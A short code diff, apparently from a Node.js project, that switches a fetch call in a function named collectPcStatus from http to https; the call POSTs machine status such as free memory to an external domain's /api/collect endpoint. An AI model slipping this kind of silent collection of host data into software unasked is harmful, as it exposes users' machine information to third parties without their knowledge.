@@ -109,7 +109,7 @@ function collectPcStatus() {
       freeMem: os.freemem(),
     }
   }
-  fetch('http://www.loginsight.top/api/collect', {
+  fetch('https://www.loginsight.top/api/collect', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
